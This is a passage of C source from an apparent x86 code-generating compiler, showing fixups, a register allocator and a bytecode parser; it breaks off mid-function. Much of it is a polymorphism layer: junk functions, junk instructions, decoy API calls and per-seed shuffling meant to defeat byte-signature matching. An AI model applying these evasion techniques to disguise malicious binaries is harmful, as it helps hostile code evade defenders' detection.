    g_abs_faddr_fixup_offsets[g_abs_faddr_fixup_count] = code_offset;
    g_abs_faddr_fixup_targets[g_abs_faddr_fixup_count] = target_code_offset;
    g_abs_faddr_fixup_count = g_abs_faddr_fixup_count + 1;
}

void add_faddr_fixup(int offset, int func_idx) {
    int new_cap;
    int* new_off;
    int* new_tgt;
    int i;
    if (g_faddr_fixup_count >= g_faddr_fixup_cap) {
        new_cap = g_faddr_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_tgt = malloc(new_cap * 4);
        i = 0;
        while (i < g_faddr_fixup_count) {
            new_off[i] = g_faddr_fixup_offsets[i];
            new_tgt[i] = g_faddr_fixup_targets[i];
            i = i + 1;
        }
        free(g_faddr_fixup_offsets);
        free(g_faddr_fixup_targets);
        g_faddr_fixup_offsets = new_off;
        g_faddr_fixup_targets = new_tgt;
        g_faddr_fixup_cap = new_cap;
    }
    g_faddr_fixup_offsets[g_faddr_fixup_count] = offset;
    g_faddr_fixup_targets[g_faddr_fixup_count] = func_idx;
    g_faddr_fixup_count = g_faddr_fixup_count + 1;
}

void add_junk_call_fixup(int offset, int junk_idx) {
    int new_cap;
    int* new_off;
    int* new_tgt;
    int i;
    if (g_junk_call_fixup_count >= g_junk_call_fixup_cap) {
        new_cap = g_junk_call_fixup_cap * 2;
        new_off = malloc(new_cap * 4);
        new_tgt = malloc(new_cap * 4);
        i = 0;
        while (i < g_junk_call_fixup_count) {
            new_off[i] = g_junk_call_fixup_offsets[i];
            new_tgt[i] = g_junk_call_fixup_targets[i];
            i = i + 1;
        }
        free(g_junk_call_fixup_offsets);
        free(g_junk_call_fixup_targets);
        g_junk_call_fixup_offsets = new_off;
        g_junk_call_fixup_targets = new_tgt;
        g_junk_call_fixup_cap = new_cap;
    }
    g_junk_call_fixup_offsets[g_junk_call_fixup_count] = offset;
    g_junk_call_fixup_targets[g_junk_call_fixup_count] = junk_idx;
    g_junk_call_fixup_count = g_junk_call_fixup_count + 1;
}

// Generate one complete junk x86 function
void gen_junk_function(int junk_idx) {
    int instr_count;
    int j;
    int choice;
    int reg;
    int reg2;
    int imm;
    int slot;

    g_junk_func_offsets[junk_idx] = g_code->len;

    // Prologue
    emit_push(REG_EBP);
    emit_mov_rr(REG_EBP, REG_ESP);
    emit_sub_ri(REG_ESP, 16);
    emit_push(REG_EBX);
    emit_push(REG_ESI);
    emit_push(REG_EDI);

    // 5-15 random instructions, with a synthetic harmless call in the middle
    instr_count = prng_range(11) + 5;
    j = 0;
    while (j < instr_count) {
        if (j == instr_count / 2 && g_x86_harmless_calls != 0 && g_harmless_api_count > 0) {
            emit_harmless_api_call(g_harmless_api_indices[prng_range(g_harmless_api_count)]);
        }
        choice = prng_range(8);
        reg = prng_range(3);  // EAX, ECX, EDX only
        reg2 = prng_range(3);
        imm = prng_range(65536);
        slot = (prng_range(4) + 1) * 4;  // 4,8,12,16

        if (choice == 0) {
            emit_mov_ri(reg, imm);
        } else if (choice == 1) {
            emit_add_rr(reg, reg2);
        } else if (choice == 2) {
            emit_xor_ri(reg, imm);
        } else if (choice == 3) {
            emit_mov_mr_disp(REG_EBP, 0 - slot, reg);
        } else if (choice == 4) {
            emit_mov_rm_disp(reg, REG_EBP, 0 - slot);
        } else if (choice == 5) {
            emit_cmp_ri(reg, imm);
        } else if (choice == 6) {
            emit_imul_rr(reg, reg2);
        } else {
            emit_sub_ri(reg, imm);
        }
        j = j + 1;
    }

    // Return a "result"
    emit_mov_ri(REG_EAX, prng_range(65536));

    // Epilogue
    emit_pop(REG_EDI);
    emit_pop(REG_ESI);
    emit_pop(REG_EBX);
    emit_mov_rr(REG_ESP, REG_EBP);
    emit_pop(REG_EBP);
    emit_ret();
}

// Maybe emit a call to a junk function
void maybe_emit_junk_call(int probability) {
    int junk_idx;
    int arg_count;
    int a;

    if (g_x86_junk_funcs == 0) { return; }
    if (g_junk_func_count <= 0) { return; }
    if (prng_range(100) >= probability) { return; }

    junk_idx = prng_range(g_junk_func_count);
    arg_count = prng_range(4);  // 0-3 args

    // Push random immediate arguments
    a = 0;
    while (a < arg_count) {
        emit_push_i(prng_range(65536));
        a = a + 1;
    }

    // CALL rel32 placeholder
    emit_byte(0xE8);
    add_junk_call_fixup(g_code->len, junk_idx);
    emit_u32(0);

    // Caller cleanup
    if (arg_count > 0) {
        emit_add_ri(REG_ESP, arg_count * 4);
    }
    // Result in EAX is discarded (free register)
}


// Emit one junk pattern inside a hand-managed stack frame. Coin-flips per gap
// so insertion is sparse (~50%, PRNG-driven) -- keeps the call reasonably
// compact while still breaking up the fixed byte template.
// Skips pattern 3 (PUSH/MOV/POP) which would disrupt manual ESP tracking,
// constrains the free-reg pool to {EBX, EAX, ECX, EDX} (the only regs the
// harmless-call template itself saves/restores), and masks busy_reg_mask
// on top so junk doesn't clobber live EBX/EAX in the PIC sequence.
void emit_harmless_junk(int busy_reg_mask) {
    int coin;
    int save_alloc[8];
    int save_order[8];
    int save_num;
    int save_aware;
    int pattern;
    int spin;
    int r;

    coin = prng_range(2);
    if (coin == 0) { return; }

    save_aware = g_junk_ra_aware;
    save_num = g_ra_num_regs;
    r = 0;
    while (r < 8) {
        save_alloc[r] = g_ra_alloc[r];
        save_order[r] = g_ra_reg_order[r];
        r = r + 1;
    }

    if (save_aware != 0) {
        // Real RA published: mask busy bits + ESI/EDI on top of current alloc.
        r = 0;
        while (r < 8) {
            if ((busy_reg_mask & (1 << r)) != 0) {
                g_ra_alloc[r] = 999;
            }
            r = r + 1;
        }
        g_ra_alloc[REG_ESI] = 999;
        g_ra_alloc[REG_EDI] = 999;
    } else {
        // Synthesize: 4-reg pool {EBX, EAX, ECX, EDX}, all free except busy.
        g_junk_ra_aware = 1;
        g_ra_num_regs = 4;
        g_ra_reg_order[0] = REG_EBX;
        g_ra_reg_order[1] = REG_EAX;
        g_ra_reg_order[2] = REG_ECX;
        g_ra_reg_order[3] = REG_EDX;
        r = 0;
        while (r < 8) {
            if ((busy_reg_mask & (1 << r)) != 0) {
                g_ra_alloc[r] = 999;
            } else {
                g_ra_alloc[r] = 0 - 1;
            }
            r = r + 1;
        }
    }

    spin = 0;
    pattern = 0;
    while (spin < 16) {
        pattern = genome_pick(GI_JUNK_SEQ_WEIGHTS, 8);
        if (pattern != 3) {
            spin = 16;
        } else {
            spin = spin + 1;
        }
    }
    if (pattern == 3) { pattern = 0; }

    emit_junk_pattern(pattern);

    g_junk_ra_aware = save_aware;
    g_ra_num_regs = save_num;
    r = 0;
    while (r < 8) {
        g_ra_alloc[r] = save_alloc[r];
        g_ra_reg_order[r] = save_order[r];
        r = r + 1;
    }
}

// Emit a call to a harmless 0-param extern API via PIC API table.
// Saves/restores EBX, EAX, ECX, EDX so that live register-allocator temps
// are not clobbered: EBX is explicitly set by CALL+POP+SUB; EAX/ECX/EDX
// are trashed by the cdecl callee.  ESI/EDI are callee-saved by the API.
void emit_harmless_api_call(int func_idx) {
    int current_pos;
    int mEAX;
    int mECX;
    int mEDX;
    int mEBX;

    if (g_abs_mode == 1) {
        // Abs PE: save volatile regs, CALL [IAT] (FF 15), restore
        emit_push(REG_EAX);
        emit_push(REG_ECX);
        emit_push(REG_EDX);
        emit_byte(0xFF); emit_byte(0x15);
        add_abs_extern_fixup(g_code->len, func_idx);
        emit_u32(0);
        emit_pop(REG_EDX);
        emit_pop(REG_ECX);
        emit_pop(REG_EAX);
        return;
    }
    if (g_abs_mode == 2) {
        // Abs ELF: save volatile regs, CALL rel32 to syscall wrapper, restore
        emit_push(REG_EAX);
        emit_push(REG_ECX);
        emit_push(REG_EDX);
        emit_byte(0xE8);
        add_abs_extern_fixup(g_code->len, func_idx);
        emit_u32(0);
        emit_pop(REG_EDX);
        emit_pop(REG_ECX);
        emit_pop(REG_EAX);
        return;
    }

    // PIC mode: Save registers that the sequence or the callee will clobber.
    // Junk is interspersed at every safe gap (~50% probability per gap,
    // PRNG-driven) to break up the fixed byte template that would otherwise
    // match across seeds. emit_pic_getbase is inlined here so junk can also
    // be inserted between CALL+0 / POP / SUB.
    mEAX = 1 << REG_EAX;
    mECX = 1 << REG_ECX;
    mEDX = 1 << REG_EDX;
    mEBX = 1 << REG_EBX;

    emit_push(REG_EBX);
    emit_harmless_junk(mEAX | mECX | mEDX);
    emit_push(REG_EAX);
    emit_harmless_junk(mECX | mEDX);
    emit_push(REG_ECX);
    emit_harmless_junk(mEDX);
    emit_push(REG_EDX);
    emit_harmless_junk(0);

    current_pos = g_code->len;
    emit_byte(0xE8);
    emit_u32(0);
    emit_harmless_junk(0);
    emit_pop(REG_EBX);
    emit_harmless_junk(mEBX);
    emit_sub_ri(REG_EBX, current_pos + 5);
    emit_harmless_junk(mEBX);
    emit_mov_rm_disp(REG_EAX, REG_EBX, g_api_slot_offset);
    emit_harmless_junk(mEBX | mEAX);
    emit_mov_rm_disp(REG_EAX, REG_EAX, func_idx * 4);
    emit_harmless_junk(mEAX);
    emit_byte(0xFF);
    emit_byte(0xD0);
    emit_harmless_junk(0);

    emit_pop(REG_EDX);
    emit_harmless_junk(mEDX);
    emit_pop(REG_ECX);
    emit_harmless_junk(mEDX | mECX);
    emit_pop(REG_EAX);
    emit_harmless_junk(mEDX | mECX | mEAX);
    emit_pop(REG_EBX);
}

// Find harmless 0-param extern APIs by matching dll_name against platform.
// Any 0-param extern from kernel32.dll (Win32) or libc.so.6 (Linux) is
// automatically treated as harmless — no per-name whitelist needed.
int is_harmless_extern(struct Function* f) {
    if (f->param_count != 0) { return 0; }
    if (f->dll_name == 0) { return 0; }
    if (g_cdecl_externs != 0 && str_eq(f->dll_name, "libc.so.6") != 0) { return 1; }
    if (g_cdecl_externs == 0 && str_eq(f->dll_name, "kernel32.dll") != 0) { return 1; }
    return 0;
}

// Return the function's api_slot. Set during parse_bytecode
// and optionally permuted per-seed by permute_api_slots.
int get_api_slot(int func_idx) {
    return g_mod->funcs[func_idx].api_slot;
}

// Per-seed permutation of extern api_slot values. Shuffles the dense
// extern slot space (0..N-1) among the N externs. Skipped in ELF abs mode
// because the syscall wrapper builder hardcodes wrapper bodies per slot
// index.
void permute_api_slots() {
    int n;
    int n_externs;
    int* extern_indices;
    int* extern_slots;
    int i;
    int j;
    int k;
    int tmp;

    n = g_mod->func_count;
    n_externs = 0;
    i = 0;
    while (i < n) {
        if (g_mod->funcs[i].block_count == 0) {
            n_externs = n_externs + 1;
        }
        i = i + 1;
    }
    if (n_externs <= 1) { return; }

    extern_indices = malloc(n_externs * 4);
    extern_slots = malloc(n_externs * 4);
    k = 0;
    i = 0;
    while (i < n) {
        if (g_mod->funcs[i].block_count == 0) {
            extern_indices[k] = i;
            extern_slots[k] = g_mod->funcs[i].api_slot;
            k = k + 1;
        }
        i = i + 1;
    }

    // Fisher-Yates shuffle the slot VALUES (preserving the set 0..N-1)
    i = n_externs - 1;
    while (i > 0) {
        j = prng_range(i + 1);
        tmp = extern_slots[i];
        extern_slots[i] = extern_slots[j];
        extern_slots[j] = tmp;
        i = i - 1;
    }
    i = 0;
    while (i < n_externs) {
        g_mod->funcs[extern_indices[i]].api_slot = extern_slots[i];
        i = i + 1;
    }
    free(extern_indices);
    free(extern_slots);
}

void find_harmless_apis() {
    int i;
    int count;
    struct Function* f;

    // Pass 1: count harmless 0-param externs (can be at any index after shuffling)
    count = 0;
    i = 0;
    while (i < g_mod->func_count) {
        f = &g_mod->funcs[i];
        if (f->block_count == 0 && is_harmless_extern(f) != 0) {
            count = count + 1;
        }
        i = i + 1;
    }

    g_harmless_api_count = 0;
    if (count == 0) { g_harmless_api_indices = malloc(4); return; }
    g_harmless_api_indices = malloc(count * 4);

    // Pass 2: fill with API slot values
    i = 0;
    while (i < g_mod->func_count) {
        f = &g_mod->funcs[i];
        if (f->block_count == 0 && is_harmless_extern(f) != 0) {
            g_harmless_api_indices[g_harmless_api_count] = get_api_slot(i);
            g_harmless_api_count = g_harmless_api_count + 1;
        }
        i = i + 1;
    }
}

void maybe_emit_harmless_api_call(int probability) {
    int idx;

    if (g_x86_harmless_calls == 0) { return; }
    if (g_harmless_api_count <= 0) { return; }
    if (prng_range(100) >= probability) { return; }
    idx = prng_range(g_harmless_api_count);
    emit_harmless_api_call(g_harmless_api_indices[idx]);
}

int get_temp_offset(int temp_idx) {
    return 0 - ((temp_idx + 1) * 4);
}

int get_local_offset(int local_idx) {
    int offset;
    int i;
    int sz;
    offset = 0 - (g_current_func->temp_count * 4);
    i = 0;
    while (i <= local_idx) {
        sz = g_current_func->local_sizes[i];
        if (sz < 4) {
            sz = 4;
        }
        offset = offset - sz;
        i = i + 1;
    }
    return offset;
}

int get_param_offset(int param_idx) {
    return 8 + (param_idx * 4);
}

void load_operand(struct Operand* op, int dst_reg) {
    int offset;
    int str_idx;
    int base_pos;

    if (op->kind == VK_CONST) {
        emit_mov_ri(dst_reg, op->value);
    } else if (op->kind == VK_TEMP) {
        offset = get_temp_offset(op->index);
        emit_mov_rm_disp(dst_reg, REG_EBP, offset);
    } else if (op->kind == VK_PARAM) {
        offset = get_param_offset(op->index);
        emit_mov_rm_disp(dst_reg, REG_EBP, offset);
    } else if (op->kind == VK_LOCAL) {
        offset = get_local_offset(op->index);
        emit_mov_rm_disp(dst_reg, REG_EBP, offset);
    } else if (op->kind == VK_STRING) {
        if (g_pic_mode != 0) {
            str_idx = op->index;
            base_pos = emit_pic_lea(dst_reg);
            add_str_fixup(g_code->len, str_idx, base_pos);
            emit_u32(0);
        } else if (g_abs_mode != 0) {
            emit_mov_ri(dst_reg, 0);
            add_abs_data_fixup(g_code->len - 4, g_str_offsets[op->index]);
        } else {
            emit_mov_ri(dst_reg, 0);
        }
    } else if (op->kind == VK_GLOBAL) {
        if (g_pic_mode != 0) {
            base_pos = emit_pic_lea(dst_reg);
            add_glob_fixup(g_code->len, op->index, base_pos);
            emit_u32(0);
            emit_mov_rm(dst_reg, dst_reg);
        } else if (g_abs_mode != 0) {
            emit_byte(0x8B);
            emit_byte(modrm(0, dst_reg, 5));
            add_abs_data_fixup(g_code->len, g_global_offsets[op->index]);
            emit_u32(0);
        } else {
            emit_mov_ri(dst_reg, g_global_offsets[op->index]);
            emit_mov_rm(dst_reg, dst_reg);
        }
    }
}

// =============================================================================
// Register Allocator
// =============================================================================

void ra_init_func(int func_idx) {
    struct Function* func;
    int tc;
    int i; int j; int tmp;
    int b; int a;
    struct Block* blk;
    struct Instruction* ins;
    func = &g_mod->funcs[func_idx];
    tc = func->temp_count;
    g_ra_temp_reg = malloc(tc * 4);
    g_ra_dirty = malloc(tc * 4);
    g_ra_last_use = malloc(tc * 4);
    i = 0;
    while (i < tc) {
        g_ra_temp_reg[i] = -1;
        g_ra_dirty[i] = 0;
        g_ra_last_use[i] = -1;
        i = i + 1;
    }
    i = 0;
    while (i < 8) {
        g_ra_alloc[i] = -1;
        i = i + 1;
    }
    // Set up allocatable registers
    if (g_pic_mode != 0) {
        g_ra_num_regs = 5;
        g_ra_reg_order[0] = REG_EAX;
        g_ra_reg_order[1] = REG_ECX;
        g_ra_reg_order[2] = REG_EDX;
        g_ra_reg_order[3] = REG_ESI;
        g_ra_reg_order[4] = REG_EDI;
    } else {
        g_ra_num_regs = 6;
        g_ra_reg_order[0] = REG_EAX;
        g_ra_reg_order[1] = REG_ECX;
        g_ra_reg_order[2] = REG_EDX;
        g_ra_reg_order[3] = REG_EBX;
        g_ra_reg_order[4] = REG_ESI;
        g_ra_reg_order[5] = REG_EDI;
    }
    // Compute last block where each temp is referenced
    g_ra_temp_last_block = malloc(tc * 4);
    i = 0;
    while (i < tc) {
        g_ra_temp_last_block[i] = -1;
        i = i + 1;
    }
    b = 0;
    while (b < func->block_count) {
        blk = &func->blocks[b];
        i = 0;
        while (i < blk->instr_count) {
            ins = &blk->instrs[i];
            if (ins->src1.kind == VK_TEMP) { g_ra_temp_last_block[ins->src1.index] = b; }
            if (ins->src2.kind == VK_TEMP) { g_ra_temp_last_block[ins->src2.index] = b; }
            if (ins->dest.kind == VK_TEMP) { g_ra_temp_last_block[ins->dest.index] = b; }
            if ((ins->opcode == OP_CALL || ins->opcode == OP_CALLV
                || ins->opcode == OP_ICALL || ins->opcode == OP_ICALLV
                || ins->opcode == OP_SYSCALL) && ins->arg_count > 0) {
                a = 0;
                while (a < ins->arg_count) {
                    if (ins->args[a].kind == VK_TEMP) { g_ra_temp_last_block[ins->args[a].index] = b; }
                    a = a + 1;
                }
            }
            i = i + 1;
        }
        b = b + 1;
    }
    g_ra_cur_block = 0;
    // Shuffle for polymorphism. Unconditional -- RA shuffle is orthogonal to
    // instruction-pattern polymorphism, and gating it behind poly_instrs
    // made "no transforms" produce bit-identical output across seeds.
    i = g_ra_num_regs - 1;
    while (i > 0) {
        j = prng_range(i + 1);
        tmp = g_ra_reg_order[i];
        g_ra_reg_order[i] = g_ra_reg_order[j];
        g_ra_reg_order[j] = tmp;
        i = i - 1;
    }
}

void ra_free_func() {
    free(g_ra_temp_reg); g_ra_temp_reg = 0;
    free(g_ra_dirty); g_ra_dirty = 0;
    free(g_ra_last_use); g_ra_last_use = 0;
    free(g_ra_temp_last_block); g_ra_temp_last_block = 0;
}

void ra_begin_block(int blk_idx) {
    struct Block* blk;
    struct Instruction* ins;
    int r; int i; int k; int tc; int opcode;
    blk = &g_current_func->blocks[blk_idx];
    tc = g_current_func->temp_count;
    // Reset register state
    r = 0;
    while (r < 8) {
        g_ra_alloc[r] = -1;
        r = r + 1;
    }
    i = 0;
    while (i < tc) {
        g_ra_temp_reg[i] = -1;
        g_ra_dirty[i] = 0;
        g_ra_last_use[i] = -1;
        i = i + 1;
    }
    // Compute last-use (backward scan)
    i = blk->instr_count - 1;
    while (i >= 0) {
        ins = &blk->instrs[i];
        opcode = ins->opcode;
        // src1
        if (ins->src1.kind == VK_TEMP) {
            if (g_ra_last_use[ins->src1.index] < 0) {
                g_ra_last_use[ins->src1.index] = i;
            }
        }
        // src2
        if (ins->src2.kind == VK_TEMP) {
            if (g_ra_last_use[ins->src2.index] < 0) {
                g_ra_last_use[ins->src2.index] = i;
            }
        }
        // dest used as source in STORE (opcode 65)
        if (opcode == OP_STORE) {
            if (ins->dest.kind == VK_TEMP) {
                if (g_ra_last_use[ins->dest.index] < 0) {
                    g_ra_last_use[ins->dest.index] = i;
                }
            }
        }
        // CALL/CALLV/ICALL/ICALLV/SYSCALL args
        if (opcode == OP_CALL || opcode == OP_CALLV || opcode == OP_ICALL || opcode == OP_ICALLV
            || opcode == OP_SYSCALL) {
            k = 0;
            while (k < ins->arg_count) {
                if (ins->args[k].kind == VK_TEMP) {
                    if (g_ra_last_use[ins->args[k].index] < 0) {
                        g_ra_last_use[ins->args[k].index] = i;
                    }
                }
                k = k + 1;
            }
        }
        i = i - 1;
    }
}

void ra_spill_reg(int reg) {
    int temp; int off;
    temp = g_ra_alloc[reg];
    if (temp < 0) { return; }
    if (g_ra_dirty[temp] != 0) {
        off = 0 - (4 + temp * 4);
        emit_mov_mr_disp(REG_EBP, off, reg);
        g_ra_dirty[temp] = 0;
    }
    g_ra_temp_reg[temp] = -1;
    g_ra_alloc[reg] = -1;
}

void ra_spill_all() {
    int r;
    r = 0;
    while (r < 8) {
        if (g_ra_alloc[r] >= 0) { ra_spill_reg(r); }
        g_ra_alloc[r] = -1;
        r = r + 1;
    }
}

int ra_find_free() {
    int i; int r;
    i = 0;
    while (i < g_ra_num_regs) {
        r = g_ra_reg_order[i];
        if (g_ra_alloc[r] == -1) { return r; }
        i = i + 1;
    }
    return -1;
}

int ra_pick_victim(int ex1, int ex2, int ex3) {
    int best; int best_score;
    int i; int r; int t; int lu;
    best = -1;
    best_score = -1;
    i = 0;
    while (i < g_ra_num_regs) {
        r = g_ra_reg_order[i];
        if (r != ex1 && r != ex2 && r != ex3) {
            if (g_ra_alloc[r] == -2) {
                // scratch in use, skip
            } else if (g_ra_alloc[r] < 0) {
                return r;
            } else {
                t = g_ra_alloc[r];
                lu = g_ra_last_use[t];
                if (lu < 0) { return r; }
                if (lu > best_score) {
                    best_score = lu;
                    best = r;
                }
            }
        }
        i = i + 1;
    }
    if (best >= 0) { return best; }
    // Fallback
    i = 0;
    while (i < g_ra_num_regs) {
        r = g_ra_reg_order[i];
        if (r != ex1 && r != ex2 && r != ex3) { return r; }
        i = i + 1;
    }
    return g_ra_reg_order[0];
}

int ra_ensure(int temp) {
    int reg; int off;
    reg = g_ra_temp_reg[temp];
    if (reg >= 0) { return reg; }
    reg = ra_find_free();
    if (reg < 0) {
        reg = ra_pick_victim(-1, -1, -1);
        ra_spill_reg(reg);
    }
    off = 0 - (4 + temp * 4);
    emit_mov_rm_disp(reg, REG_EBP, off);
    g_ra_alloc[reg] = temp;
    g_ra_temp_reg[temp] = reg;
    g_ra_dirty[temp] = 0;
    return reg;
}

int ra_ensure_ex(int temp, int exclude) {
    int reg; int off; int i; int r;
    reg = g_ra_temp_reg[temp];
    if (reg >= 0) { return reg; }
    reg = -1;
    i = 0;
    while (i < g_ra_num_regs) {
        r = g_ra_reg_order[i];
        if (r != exclude) {
            if (g_ra_alloc[r] == -1) { reg = r; i = g_ra_num_regs; }
        }
        i = i + 1;
    }
    if (reg < 0) {
        reg = ra_pick_victim(exclude, -1, -1);
        ra_spill_reg(reg);
    }
    off = 0 - (4 + temp * 4);
    emit_mov_rm_disp(reg, REG_EBP, off);
    g_ra_alloc[reg] = temp;
    g_ra_temp_reg[temp] = reg;
    g_ra_dirty[temp] = 0;
    return reg;
}

int ra_def(int temp, int ex1, int ex2) {
    int reg;
    if (g_ra_temp_reg[temp] >= 0) {
        g_ra_dirty[temp] = 1;
        return g_ra_temp_reg[temp];
    }
    reg = ra_find_free();
    if (reg < 0) {
        reg = ra_pick_victim(ex1, ex2, -1);
        ra_spill_reg(reg);
    }
    g_ra_alloc[reg] = temp;
    g_ra_temp_reg[temp] = reg;
    g_ra_dirty[temp] = 1;
    return reg;
}

int ra_def_reuse(int temp, int hint, int ex1) {
    int ht; int off;
    if (g_ra_temp_reg[temp] >= 0) {
        g_ra_dirty[temp] = 1;
        return g_ra_temp_reg[temp];
    }
    if (hint >= 0 && hint != ex1) {
        ht = g_ra_alloc[hint];
        if (ht >= 0 && ht != temp && g_ra_last_use[ht] == g_ra_cur_instr) {
            if (g_ra_dirty[ht] != 0 && g_ra_temp_last_block[ht] > g_ra_cur_block) {
                off = 0 - (4 + ht * 4);
                emit_mov_mr_disp(REG_EBP, off, hint);
            }
            g_ra_temp_reg[ht] = -1;
            g_ra_dirty[ht] = 0;
            g_ra_alloc[hint] = temp;
            g_ra_temp_reg[temp] = hint;
            g_ra_dirty[temp] = 1;
            return hint;
        }
    }
    return ra_def(temp, hint, ex1);
}

void ra_force(int temp, int wanted) {
    int cur; int occ; int alt; int off; int i; int r;
    cur = g_ra_temp_reg[temp];
    if (cur == wanted) { return; }
    occ = g_ra_alloc[wanted];
    if (occ >= 0 && occ != temp) {
        // Find truly free register
        alt = -1;
        i = 0;
        while (i < g_ra_num_regs) {
            r = g_ra_reg_order[i];
            if (g_ra_alloc[r] == -1) { alt = r; i = g_ra_num_regs; }
            i = i + 1;
        }
        if (alt >= 0) {
            emit_mov_rr(alt, wanted);
            g_ra_alloc[alt] = occ;
            g_ra_temp_reg[occ] = alt;
        } else {
            ra_spill_reg(wanted);
        }
    } else if (occ == -2) {
        g_ra_alloc[wanted] = -1;
    }
    if (cur >= 0) {
        emit_mov_rr(wanted, cur);
        g_ra_alloc[cur] = -1;
    } else {
        off = 0 - (4 + temp * 4);
        emit_mov_rm_disp(wanted, REG_EBP, off);
        g_ra_dirty[temp] = 0;
    }
    g_ra_alloc[wanted] = temp;
    g_ra_temp_reg[temp] = wanted;
}

int ra_load_src(struct Operand* op) {
    int reg;
    if (op->kind == VK_TEMP) {
        return ra_ensure(op->index);
    }
    reg = ra_find_free();
    if (reg < 0) {
        reg = ra_pick_victim(-1, -1, -1);
        ra_spill_reg(reg);
    }
    g_ra_alloc[reg] = -2;
    load_operand(op, reg);
    return reg;
}

// Same as ra_load_src but excludes a specific register from being chosen.
// Used as the second load in two-operand patterns to avoid evicting r1.
int ra_load_src_ex(struct Operand* op, int exclude) {
    int reg; int i; int r;
    if (op->kind == VK_TEMP) {
        return ra_ensure_ex(op->index, exclude);
    }
    reg = -1;
    i = 0;
    while (i < g_ra_num_regs) {
        r = g_ra_reg_order[i];
        if (r != exclude) {
            if (g_ra_alloc[r] == -1) { reg = r; i = g_ra_num_regs; }
        }
        i = i + 1;
    }
    if (reg < 0) {
        reg = ra_pick_victim(exclude, -1, -1);
        ra_spill_reg(reg);
    }
    g_ra_alloc[reg] = -2;
    load_operand(op, reg);
    return reg;
}

int ra_get_scratch(int ex1, int ex2, int ex3) {
    int i; int r;
    i = 0;
    while (i < g_ra_num_regs) {
        r = g_ra_reg_order[i];
        if (r != ex1 && r != ex2 && r != ex3) {
            if (g_ra_alloc[r] == -1) {
                g_ra_alloc[r] = -2;
                return r;
            }
        }
        i = i + 1;
    }
    r = ra_pick_victim(ex1, ex2, ex3);
    ra_spill_reg(r);
    g_ra_alloc[r] = -2;
    return r;
}

void ra_free_dead() {
    int r; int t; int off;
    r = 0;
    while (r < 8) {
        t = g_ra_alloc[r];
        if (t >= 0 && g_ra_last_use[t] == g_ra_cur_instr) {
            if (g_ra_dirty[t] != 0) {
                off = 0 - (4 + t * 4);
                emit_mov_mr_disp(REG_EBP, off, r);
            }
            g_ra_dirty[t] = 0;
            g_ra_temp_reg[t] = -1;
            g_ra_alloc[r] = -1;
        }
        r = r + 1;
    }
}

void ra_clear_scratch() {
    int r;
    r = 0;
    while (r < 8) {
        if (g_ra_alloc[r] == -2) { g_ra_alloc[r] = -1; }
        r = r + 1;
    }
}

void ra_free_reg(int reg) {
    if (g_ra_alloc[reg] >= 0) { ra_spill_reg(reg); }
    g_ra_alloc[reg] = -2;
}


void zero_instr(struct Instruction* ins) {
    ins->opcode = 0;
    ins->dest.kind = 0;
    ins->dest.index = 0;
    ins->dest.value = 0;
    ins->src1.kind = 0;
    ins->src1.index = 0;
    ins->src1.value = 0;
    ins->src2.kind = 0;
    ins->src2.index = 0;
    ins->src2.value = 0;
    ins->type_code = 0;
    ins->target_block = 0;
    ins->func_idx = 0;
    ins->arg_count = 0;
    ins->args = 0;
    ins->offset = 0;
    ins->elem_size = 0;
}


// =============================================================================
//
// Bytecode Module
//
// Contains the following sections:
//   1. Bytecode Reader
//   2. Bytecode Parser
//   3. Bytecode Writer
//
// =============================================================================

// =============================================================================
// Bytecode Reader
// =============================================================================

char* g_bc_data;
int g_bc_len;
int g_bc_pos;

void bc_init(char* data, int len) {
    g_bc_data = data;
    g_bc_len = len;
    g_bc_pos = 0;
}

int bc_read_u8() {
    int val;
    if (g_bc_pos >= g_bc_len) {
        return 0;
    }
    val = g_bc_data[g_bc_pos] & 0xFF;
    g_bc_pos = g_bc_pos + 1;
    return val;
}

int bc_read_u16() {
    int lo;
    int hi;
    lo = bc_read_u8();
    hi = bc_read_u8();
    return lo | (hi << 8);
}

int bc_read_i32() {
    int b0;
    int b1;
    int b2;
    int b3;
    b0 = bc_read_u8();
    b1 = bc_read_u8();
    b2 = bc_read_u8();
    b3 = bc_read_u8();
    return b0 | (b1 << 8) | (b2 << 16) | (b3 << 24);
}

void bc_read_operand(struct Operand* op) {
    int kind;
    int lo;
    int hi;

    kind = bc_read_u8();
    op->kind = kind;
    op->index = 0;
    op->value = 0;

    if (kind == VK_CONST) {
        op->value = bc_read_i32();
    } else {
        // All non-const operands: u16 index
        op->index = bc_read_u16();
    }
}


// Bytecode magic
int MC_MAGIC = 0x4E42434D;

// =============================================================================
// Bytecode Parser
// =============================================================================

int MC_SIZEOF_GLOBAL = 24;
int MC_SIZEOF_FUNCTION = 56;
int MC_SIZEOF_BLOCK = 12;
int MC_SIZEOF_INSTRUCTION = 76;
int MC_SIZEOF_OPERAND = 12;

struct Module* parse_bytecode(char* data, int len) {
    int magic;
    int version;
    int target;
    int flags;
    int string_count;
    int struct_count;
    int global_count;
    int func_count;
    int total_string_size;
    int* str_offsets;
    int str_data_start;
    int slen;
    int name_idx;
    int field_count;
    int i;
    int j;
    int b;
    int k;
    int opcode;
    int loc_kind;
    int loc_idx;
    int a;

    struct Module* mod;
    struct Function* f;
    struct Block* blk;
    struct Instruction* ins;

    bc_init(data, len);

    magic = bc_read_i32();
    if (magic != MC_MAGIC) {
        print_err("Invalid bytecode magic: got ");
        print_int_err(magic);
        print_err(" expected ");
        print_int_err(MC_MAGIC);
        print_err(" data=");
        print_int_err(data);
        print_err(" len=");
        print_int_err(len);
        print_err("\n");
        return 0;
    }

    version = bc_read_u16();
    target = bc_read_u8();
    flags = bc_read_u8();
    string_count = bc_read_u16();
    struct_count = bc_read_u16();
    global_count = bc_read_u16();
    func_count = bc_read_u16();

    mod = malloc(28);
    mod->string_count = string_count;
    mod->global_count = global_count;
    mod->func_count = func_count;
    mod->entry_func = 0;

    // Read strings
    mod->strings = malloc((string_count + 1) * 4);
    total_string_size = bc_read_i32();

    str_offsets = malloc((string_count + 1) * 4);
    i = 0;
    while (i < string_count) {
        str_offsets[i] = bc_read_i32();
        i = i + 1;
    }

    str_data_start = g_bc_pos;
    i = 0;
    while (i < string_count) {
        g_bc_pos = str_data_start + str_offsets[i];
        slen = 0;
        while (g_bc_pos < g_bc_len && g_bc_data[g_bc_pos] != 0) {
            slen = slen + 1;
            g_bc_pos = g_bc_pos + 1;
        }
        mod->strings[i] = malloc(slen + 1);
        mem_copy(mod->strings[i], g_bc_data + str_data_start + str_offsets[i], slen);
        mod->strings[i][slen] = 0;
        i = i + 1;
    }
    g_bc_pos = str_data_start + total_string_size;
    free(str_offsets);

    // Skip structs
    i = 0;
    while (i < struct_count) {
